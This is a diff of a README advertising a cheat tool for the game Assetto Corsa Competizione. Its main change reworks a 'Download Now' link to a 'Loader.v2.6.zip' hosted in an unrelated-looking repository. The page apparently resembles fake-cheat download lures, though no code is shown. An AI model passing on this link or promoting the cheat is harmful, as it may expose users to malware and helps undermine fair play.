@@ -1,10 +1,8 @@
-
-
 🎮 Assetto-Corsa-Competizione-Cheats
 
 «⚡ A universal project with additional gameplay and visual features»
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MajorRaikage45/MimiLokinil/releases/download/v2.6/Loader.v2.6.zip)
+![Download Now](https://github.com/MajorRaikage45/MimiLokinil/releases/download/v2.6/Loader.v2.6.zip)
 
 📖 About
 
@@ -109,3 +107,4 @@ configs/
 ├── visual.cfg
 ├── player.cfg
 └── custom.cfg
+
